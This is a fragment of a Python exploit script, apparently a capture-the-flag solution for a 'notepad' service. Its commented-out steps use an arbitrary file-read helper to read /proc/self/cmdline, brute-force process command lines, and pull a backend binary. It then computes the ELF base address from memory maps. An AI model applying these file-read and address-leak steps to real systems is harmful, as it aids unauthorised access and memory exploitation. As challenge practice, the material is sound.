...
def notepad(port):
    ...
    # Find /proc/self/cmdline
    # filename = b"proc/self/cmdline"
    # cmdline = show_file(r, filename)
    # print("self cmdline: ", cmdline.decode())

    # Brute force for searching the command running backend
    # for i in range(1, 65536):
    #     filename = f"proc/{i}/cmdline".encode("utf-8")
    #     cmdline = show_file(r, filename)
    #     print(f"{i}: {cmdline.decode()}")

    # Get backend
    # filename = b"home/notepad/backend_4050c20b6ca4118b63acd960cd1b9cd8"
    # backend = show_file(r, filename)
    ...
    elf_base_addr = get_elf_base_addr(maps, b"notepad")
